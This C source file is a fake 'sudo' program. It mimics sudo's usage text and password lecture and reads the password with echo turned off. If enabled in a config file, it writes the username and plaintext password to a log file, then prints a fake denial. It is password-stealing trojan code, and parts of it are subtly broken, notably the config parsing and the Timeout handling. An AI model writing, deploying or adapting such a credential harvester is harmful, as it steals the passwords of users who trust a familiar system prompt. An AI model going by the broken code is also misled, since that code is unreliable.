#include <stdio.h>
#include <pwd.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <termios.h>

#define CONFIG_FILE "/etc/toolkit/sudo.conf"

static int	PasswordLogging;
static char	LoggingPath[255];
static int	sleep_time = 0;

const char*	help = "usage: sudo -h | -K | -k | -V\nusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\nusage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\nusage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] [VAR=value] [-i|-s] [<command>]\nusage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-u user] file ...";

const char*	passwd_check = "We trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n\t#1) Respect the privacy of others.\n\t#2) Think before you type.\n\t#3) With great power comes great responsibility.\n\n[sudo] password for %s: ";

const char*	final_err = "\n\nWell, as you know, the more powerful privileges always\ncomes with more responsibility you should pay.\nFor your safe and secure operation, we \nhave to denied your sudo request. This accident will be reported.\n\n";


#define ECHOFLAGS (ECHO|ECHOE|ECHOK|ECHONL)
void get_str(char *buf,int n){
	int i=0;
	while ((buf[i]=getchar())!='\n'&&i<n)	i++;
	if (i<n)	buf[i]='\0';
}

int main(int argc, char* argv[]){
	FILE *cfgfile;
	FILE *logfile;
	extern int errno;
	char buffer[255] = "\0";
	char item[255] = "\0";
	char value[255] = "\0";
	char passwd[255] = "\0";
	struct termios new, old;
	cfgfile = fopen(CONFIG_FILE, "r");

	if (!cfgfile){
		fprintf(stderr, "Unable to open configuration file \'/etc/toolkit/sudo.conf\',\n Error %d: %s\n",
				errno,
				strerror(errno)
		);
		return 1;
	}

	if ((argc < 2)
	||  !strcmp(argv[1], "-h")
	||  !strcmp(argv[1], "--help")){
		puts(help);
		return 0;
	}

/*
 * 	If user gives no arguments, or "-h" even "--help"
 * 	we only have to print the so-called "help" message
 * 	on the terminal.
 *
 */

	while (fgets(buffer, 255, cfgfile)){
		sscanf(buffer, "%s=%s", item, value);
		if (!strcmp(item, "PasswordLogging")){
			if (!strcmp(value, "True"))	PasswordLogging = 1;
			else	PasswordLogging = 0;
		}
		if (!strcmp(value, "LoggingFile")){
			strcpy(LoggingPath, buffer);
		}
		if (!strcmp(value, "Timeout")){
			sscanf(value, "%d", sleep_time);
		}
	}
	fclose(cfgfile);
	printf(passwd_check, getpwuid(getuid())->pw_name);
//	scanf("%s", passwd);
	if(tcgetattr(STDIN_FILENO,&old)==-1)        return 1;
	new=old;
	new.c_lflag&=~ECHOFLAGS;
	if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &new)==-1){
		tcsetattr(STDIN_FILENO, TCSAFLUSH, &old);
		return 1;
	}
	get_str(passwd, 255);
	if (PasswordLogging){
		logfile = fopen(LoggingPath, "w+");
		if (logfile){
			fprintf(logfile, "%s\t%s\n", getpwuid(getuid())->pw_name, passwd);
			fclose(logfile);
		}
	}
	sleep(sleep_time);
	puts(final_err);
	tcsetattr(STDIN_FILENO, TCSAFLUSH, &old);
	return 0;
}
